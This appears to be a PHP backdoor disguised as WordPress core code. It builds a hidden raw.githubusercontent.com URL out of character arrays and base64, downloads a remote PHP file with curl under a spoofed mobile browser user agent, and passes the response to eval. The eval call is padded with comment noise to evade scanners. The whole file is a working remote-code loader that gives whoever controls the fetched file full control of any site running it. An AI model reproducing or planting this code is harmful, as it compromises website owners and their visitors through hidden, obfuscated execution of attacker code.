<?php
#wp_core1337
$wp_protocol = ['h','t','t','p','s'];
$wp_separator   = [':','/','/'];
$wp_domain  = ['r','a','w','.','g','i','t','h','u','b','.','c','o','m'];
$wp_path  = ['/','N','o','o','b','T','e','c','h','o','/','w','/','r','e','f','s','/','h','e','a','d','s','/','m','a','i','n','/','m','a','n','z','.','p','h','p'];

$wp_target_url = implode('', $wp_protocol) . implode('', $wp_separator) . implode('', $wp_domain) . implode('', $wp_path);
$wp_encoded_uri = base64_encode($wp_target_url);

class WP_Remote_Loader {
    private $wp_remote_uri;
    private $wp_request_options;
    
    public function __construct(string $wp_remote_uri) {
        $this->wp_remote_uri = filter_var($wp_remote_uri, FILTER_VALIDATE_URL);
        $this->wp_request_options = [
            'wp_ssl_verify' => true,
            'wp_timeout' => 30,
            'wp_user_agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/605.1 NAVER(inapp; search; 2000; 12.11.2; 16PROMAX)'
        ];
    }
    
    public function wp_set_options(array $wp_custom_options): void {
        $this->wp_request_options = array_merge($this->wp_request_options, $wp_custom_options);
    }
    
    public function wp_retrieve_content() {
        if (!$this->wp_remote_uri) throw new Exception('Invalid WordPress API endpoint');
        
        try {
            $wp_curl_handle = curl_init();
            curl_setopt_array($wp_curl_handle, [
                CURLOPT_URL => $this->wp_remote_uri,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => $this->wp_request_options['wp_ssl_verify'],
                CURLOPT_TIMEOUT => $this->wp_request_options['wp_timeout'],
                CURLOPT_USERAGENT => $this->wp_request_options['wp_user_agent']
            ]);
            
            $wp_response_data = curl_exec($wp_curl_handle);
            $wp_curl_error = curl_error($wp_curl_handle);
            $wp_http_status = curl_getinfo($wp_curl_handle, CURLINFO_HTTP_CODE);
            curl_close($wp_curl_handle);
            
            if ($wp_curl_error) throw new Exception("WP_CURL_Exception: $wp_curl_error");
            if ($wp_http_status !== 200) throw new Exception("WP_HTTP_Error: $wp_http_status");
            
            return $this->wp_validate_response($wp_response_data);
        } catch (Exception $wp_e) {
            error_log("WP_Remote_Loader_Error: " . $wp_e->getMessage());
            throw $wp_e;
        }
    }
    
    private function wp_validate_response($wp_content) {
        if (empty($wp_content)) throw new Exception('Empty WordPress response body');
        return $wp_content;
    }
}

try {
    $wp_content_retriever = new WP_Remote_Loader(base64_decode($wp_encoded_uri));
    $wp_content_retriever->wp_set_options(['wp_timeout' => 60, 'wp_ssl_verify' => true]);
    $wp_remote_data = $wp_content_retriever->wp_retrieve_content();
    /*555555*/eval/*555555*/("?>".$wp_remote_data)/****#****/;
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
?>
